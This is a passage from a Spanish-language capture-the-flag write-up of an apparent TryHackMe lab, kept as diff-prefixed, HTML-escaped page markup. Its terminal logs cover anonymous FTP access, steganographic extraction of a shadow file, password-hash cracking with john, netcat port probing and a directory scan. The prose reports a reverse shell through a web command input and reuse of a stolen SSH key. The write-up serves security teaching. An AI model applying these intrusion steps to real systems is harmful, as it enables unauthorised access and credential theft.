+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/chocolat$ ftp chocolat.thm 
+Connected to chocolat.thm.
+&lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;vsFTPd 3.0.3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Name &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;chocolat.thm:kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: anonymous
+&lt;span class=&#34;m&#34;&gt;331&lt;/span&gt; Please specify the password.
+Password:
+&lt;span class=&#34;m&#34;&gt;230&lt;/span&gt; Login successful.
+Remote system &lt;span class=&#34;nb&#34;&gt;type&lt;/span&gt; is UNIX.
+Using binary mode to transfer files.
+ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
+&lt;span class=&#34;m&#34;&gt;257&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/&amp;#34;&lt;/span&gt; is the current directory
+ftp&amp;gt; ls -lah
+&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
+&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Here comes the directory listing.
+drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;65534&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;65534&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;01&lt;/span&gt; 12:11 .
+drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;65534&lt;/span&gt;    &lt;span class=&#34;m&#34;&gt;65534&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;01&lt;/span&gt; 12:11 ..
+-rw-rw-r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1000&lt;/span&gt;       &lt;span class=&#34;m&#34;&gt;208838&lt;/span&gt; Sep &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt; 14:31 gum_room.jpg
+&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Directory send OK.
+ftp&amp;gt; get gum_room.jpg
+local: gum_room.jpg remote: gum_room.jpg
+&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
+&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Opening BINARY mode data connection &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; gum_room.jpg &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;208838&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Transfer complete.
+&lt;span class=&#34;m&#34;&gt;208838&lt;/span&gt; bytes received in 4.01 secs &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;50.8460 kB/s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
+&lt;span class=&#34;m&#34;&gt;221&lt;/span&gt; Goodbye.
+kali@kali:~/thm/chocolat$ file gum_room.jpg 
+gum_room.jpg: JPEG image data, Exif standard: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;TIFF image data, big-endian, &lt;span class=&#34;nv&#34;&gt;direntries&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;, baseline, precision 8, 1920x1080, components &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;
+kali@kali:~/thm/chocolat$ steghide extract -sf gum_room.jpg 
+Enter passphrase: 
+wrote extracted data to &lt;span class=&#34;s2&#34;&gt;&amp;#34;b64.txt&amp;#34;&lt;/span&gt;.
+kali@kali:~/thm/chocolat$ head b64.txt 
+ZGFlbW9uOio6MTgzODA6MDo5OTk5OTo3Ojo6CmJpbjoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXM6
+KjoxODM4MDowOjk5OTk5Ojc6OjoKc3luYzoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpnYW1lczoqOjE4
+MzgwOjA6OTk5OTk6Nzo6OgptYW46KjoxODM4MDowOjk5OTk5Ojc6OjoKbHA6KjoxODM4MDowOjk5
+OTk5Ojc6OjoKbWFpbDoqOjE4MzgwOjA6OTk5OTk6Nzo6OgpuZXdzOio6MTgzODA6MDo5OTk5OTo3
+Ojo6CnV1Y3A6KjoxODM4MDowOjk5OTk5Ojc6OjoKcHJveHk6KjoxODM4MDowOjk5OTk5Ojc6OjoK
+d3d3LWRhdGE6KjoxODM4MDowOjk5OTk5Ojc6OjoKYmFja3VwOio6MTgzODA6MDo5OTk5OTo3Ojo6
+Cmxpc3Q6KjoxODM4MDowOjk5OTk5Ojc6OjoKaXJjOio6MTgzODA6MDo5OTk5OTo3Ojo6CmduYXRz
+Oio6MTgzODA6MDo5OTk5OTo3Ojo6Cm5vYm9keToqOjE4MzgwOjA6OTk5OTk6Nzo6OgpzeXN0ZW1k
+LXRpbWVzeW5jOio6MTgzODA6MDo5OTk5OTo3Ojo6CnN5c3RlbWQtbmV0d29yazoqOjE4MzgwOjA6
+OTk5OTk6Nzo6OgpzeXN0ZW1kLXJlc29sdmU6KjoxODM4MDowOjk5OTk5Ojc6OjoKX2FwdDoqOjE4
+kali@kali:~/thm/chocolat$ cat b64.txt &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;base64 -d
+daemon:*:18380:0:99999:7:::
+bin:*:18380:0:99999:7:::
+sys:*:18380:0:99999:7:::
+sync:*:18380:0:99999:7:::
+
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+
+_gvm:*:18496:0:99999:7:::
+charlie:&lt;span class=&#34;nv&#34;&gt;$6$CZJnCPeQWp9&lt;/span&gt;/jpNx&lt;span class=&#34;nv&#34;&gt;$khGlFdICJnr8R3JC&lt;/span&gt;/&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;uKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
+kali@kali:~/thm/chocolat$
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Utilizamos &lt;code&gt;john&lt;/code&gt; para obtener la contraseña de &lt;code&gt;charlie&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/chocolat$ john --wordlist&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt charlie_hash 
+Using default input encoding: UTF-8
+Loaded &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; password &lt;span class=&#34;nb&#34;&gt;hash&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;sha512crypt, crypt&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$6&lt;/span&gt;$ &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SHA512 256/256 AVX2 4x&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
+Cost &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;iteration count&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; is &lt;span class=&#34;m&#34;&gt;5000&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; all loaded hashes
+Will run &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; OpenMP threads
+Press &lt;span class=&#34;s1&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; status
+cn&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;           &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;charlie&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+1g 0:00:06:52 DONE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2021-01-19 21:24&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 0.002426g/s 2389p/s 2389c/s 2389C/s cocker6..cn123
+Use the &lt;span class=&#34;s2&#34;&gt;&amp;#34;--show&amp;#34;&lt;/span&gt; option to display all of the cracked passwords reliably
+Session completed
+kali@kali:~/thm/chocolat$
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;ports-&#34;&gt;PORTS&lt;/h2&gt;
+&lt;p&gt;Encontramos una lista larga de puertos a los cuales realizamos una conexion pero en cada puerto mostraba el mismo mensaje junto con un posible nombre de usuario (&lt;code&gt;Augustus&lt;/code&gt;) hasta que logramos encontrar uno donde indicaba la direccion de un archivo.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/chocolat$ nc -vvv chocolat.thm &lt;span class=&#34;m&#34;&gt;112&lt;/span&gt;
+chocolat.thm &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.0.127&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;112&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; open
+&lt;span class=&#34;s2&#34;&gt;&amp;#34;Welcome to chocolate room!! 
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;    ___  ___  ___  ___  ___.---------------.
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;  .&amp;#39;\__\&amp;#39;\__\&amp;#39;\__\&amp;#39;\__\&amp;#39;\__,`   .  ____ ___ \
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;  \|\/ __\/ __\/ __\/ __\/ _:\  |:.  \  \___ \
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;   \\&amp;#39;\__\&amp;#39;\__\&amp;#39;\__\&amp;#39;\__\&amp;#39;\_`.__|  `. \  \___ \
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;    \\/ __\/ __\/ __\/ __\/ __:                \
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;     \\&amp;#39;\__\&amp;#39;\__\&amp;#39;\__\ \__\&amp;#39;\_;-----------------`
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;      \\/   \/   \/   \/   \/ :                 |
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;       \|______________________;________________|
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;A small hint from Mr.Wonka : Look somewhere else, its not here! ;) 
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;I hope you wont drown Augustus&amp;#34;&lt;/span&gt; ^C sent 0, rcvd &lt;span class=&#34;m&#34;&gt;527&lt;/span&gt;
+kali@kali:~/thm/chocolat$ nc -vvv chocolat.thm &lt;span class=&#34;m&#34;&gt;113&lt;/span&gt;
+chocolat.thm &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.0.127&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;113&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;auth&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; open
+http://localhost/key_rev_key &amp;lt;- You will find the key here!!!
+^C sent 0, rcvd &lt;span class=&#34;m&#34;&gt;62&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Descargamos el archivo, encontramos que es un archivo ejecutable, al pasarle &lt;code&gt;strings&lt;/code&gt; sobre este encontramos un &amp;ldquo;nombre&amp;rdquo; de usuario el cual utilizamos para pasarselo, lo que nos devolvio una clave.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/thm/chocolat$ file key_rev_key 
+key_rev_key: ELF 64-bit LSB shared object, x86-64, version &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SYSV&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; GNU/Linux 3.2.0, BuildID&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;sha1&lt;span class=&#34;o&#34;&gt;]=&lt;/span&gt;8273c8c59735121c0a12747aee7ecac1aabaf1f0, not stripped
+kali@kali:~/thm/chocolat$ strings key_rev_key 
+/lib64/ld-linux-x86-64.so.2
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;9&lt;/span&gt;   
+AWAVI
+AUATL
+&lt;span class=&#34;o&#34;&gt;[]&lt;/span&gt;A&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;A^A_
+Enter your name: 
+laksdhfas
+ congratulations you have found the key:   
+b&lt;span class=&#34;s1&#34;&gt;&amp;#39;-VkgXhFf6s[... REDACTED ...]BXeQuvhcGSQzY=&amp;#39;&lt;/span&gt;
+ Keep its safe
+Bad name!
+&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;*3$&lt;span class=&#34;s2&#34;&gt;&amp;#34;
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;crtstuff.c
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;[... REDACTED ...]
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;kali@kali:~/thm/chocolat&lt;/span&gt;$&lt;span class=&#34;s2&#34;&gt; chmod +x key_rev_key 
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;kali@kali:~/thm/chocolat&lt;/span&gt;$&lt;span class=&#34;s2&#34;&gt; ./key_rev_key 
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;Enter your name: laksdhfas
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; congratulations you have found the key:   b&amp;#39;-VkgXhFf6sAEc[... REDACTED ...]eQuvhcGSQzY=&amp;#39;
+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;kali@kali:~/thm/chocolat&lt;/span&gt;$&lt;span class=&#34;s2&#34;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;http-&#34;&gt;HTTP&lt;/h2&gt;
+&lt;p&gt;Encontramos una pagina web con un simple login.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/chocolatfactory/Screenshot_20210119_201854.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h3 id=&#34;rustbuster-&#34;&gt;RUSTBUSTER&lt;/h3&gt;
+&lt;p&gt;Utilizamos rustbuster para busqueda de directorios y archivos pero no encontramos mucho.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;~ rustbuster v3.0.3 ~ by phra &lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt; ps1dr3x ~
+
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started at  : 2021-01-19 21:13:28
+
+GET &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK        http://chocolat.thm/
+GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://chocolat.thm/home.php
+GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://chocolat.thm/index.html
+GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                          http://chocolat.thm/index.html
+GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                   http://chocolat.thm/server-status
+
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Ended at: 2021-01-19 21:19:03
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;www-data---user-&#34;&gt;WWW-DATA - USER&lt;/h2&gt;
+&lt;p&gt;Utilizamos las credenciales de &lt;code&gt;charlie&lt;/code&gt; y logramos ingresar, al ingresar nos muestra un input donde es posible ejecutar comandos.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/chocolatfactory/Screenshot_20210119_203221.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Ejecutamos una shell inversa y logramos obtener una shell con el usuario &lt;code&gt;www-data&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/chocolatfactory/Screenshot_20210119_203414.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;charlie---user-&#34;&gt;CHARLIE - USER&lt;/h2&gt;
+&lt;p&gt;Dentro de la carpeta de charlie encontramos su clave privada de SSH la cual utilizamos para obtener acceso.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
